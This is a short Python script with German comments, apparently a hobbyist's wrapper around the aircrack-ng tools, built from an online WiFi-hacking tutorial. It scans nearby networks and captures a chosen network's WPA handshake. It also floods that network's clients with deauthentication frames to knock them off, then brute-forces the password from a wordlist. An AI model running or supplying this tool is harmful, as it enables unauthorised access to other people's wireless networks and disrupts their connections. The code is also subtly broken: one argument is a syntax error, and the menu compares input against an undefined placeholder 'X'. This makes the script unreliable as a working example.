# Ich hab mal ein kleines Programm geschrieben, dass die Anleitung aus dem Netz (https://www.shellhacks.com/how-to-use-aircrack-ng-wifi-password-hacker-tutorial/)
# etwas vereinfacht, ohne, dass man dafür alle Befehle einzeln eintippen muss.


#! /bin/env python
import subprocess
import sys

# Zuerst muss der NetworkManager gestoppt werden:
def stop_networkmanager():
    subprocess.run(["sudo", "systemctl", "stop", "NetworkManager.service"])


def start_networkmanager():
    subprocess.run(["sudo", "systemctl", "start", "NetworkManager.service"])


# und auch der wpa_supplicant muss gestoppt werden, damit der WLAN-Adapter in den Monitor-Modus versetzt werden kann
def stop_wpasupplicant():
    subprocess.run(["sudo", "systemctl", "stop", "wpa_supplicant.service"])


def start_wpasupplicant():
    subprocess.run(["sudo", "systemctl", "start", "wpa_supplicant.service"])


# Grad keine Ahnung, was das macht
def airmon_start_wlp3s0():
    subprocess.run(["sudo", "airmon-ng", "start", "wlp3s0"])


# Zeigt alle Netzwerke, die vom PC erreicht werden können mit BSSID, Beacons, Channel etc.
def airodumpng_mon():
    subprocess.run(["sudo", "airodump-ng", "wlp3s0mon"], stdout=subprocess.PIPE)


# Von der oben angezeigten Liste kann man nun ein Netzwerk auswählen und muss dafür
# den Channel und die BSSID eingeben, damit der Befehl dann hinterher dort den 
# Handshake tracken kann:
def collect_auth_handshake():
    print("Choose a network for injection")
    bssid_input = input("Enter the bssid: ")
    channel_input = input("Enter the number of the channel: ")
    save = input("Enter the name for the data: ")
    subprocess.run(["sudo", "airodump-ng", "-c", channel_input, "--bssid", bssid_input, "-w", "aircrack/"save, "wlp3s0mon", "--ignore-negative-one"], stdout=subprocess.PIPE)


# Falls man nicht ewig auf den letzten Befehl warten möchte, kann man das auch
# beschleunigen, in dem man ein dauth sendet. Damit werden alle verbundenen Geräte
# vom Router getrennt.
def send_dauth():
    bssid_input = input("Enter the bssid: ")
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "100", "-a", bssid_input, "wlp3s0mon", "--ignore-negative-one"])


# Nun kommt das eigentliche "hacken" in den WLAN-Hotspot. Dafür braucht man eine gute
# Passwortliste (wordlist), wieder die BSSID und die .cap Datei, die man aus dem
# Collect_auth_hanshake Befehl bekommen hat (Speicherort ist /home/BENUTZER/aircrack/NAME)
def brut_force():
    wordlist = input("Enter your wordlist: ")
    bssid_input = input("Enter the bssid: ")
    cap_data = input("Enter your chosen capdata: ")
    subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, "-b", bssid_input, cap_data])


# Dieser Befehl bringt wieder alles auf Anfang
def back_to_start():
    subprocess.run(["sudo", "airmon-ng", "stop", "wlp3s0"], stdout=subprocess.PIPE)
    start_networkmanager()
    start_wpasupplicant()


def start():
    print(". Show available networks")
    print(". Go back to home-network")
    print(". Collect a handshake and send the dauth")
    print(". Brute force your chosen network")
    print(". Gehe wieder zurueck zum Ursprungsstatus")
    user_input = int(input("Choose a number: "))

    if user_input == X:
        stop_networkmanager()
        stop_wpasupplicant()
        airmon_start_wlp3s0()
        airodumpng_mon()
    
    elif user_input == X:
        start_networkmanager()
        start_wpasupplicant()

    elif user_input == X:
        collect_auth_handshake()
        send_dauth()
    
    elif user_input == X:
        brut_force()

    else:
        pass


if __name__ == "__main__":
    start()
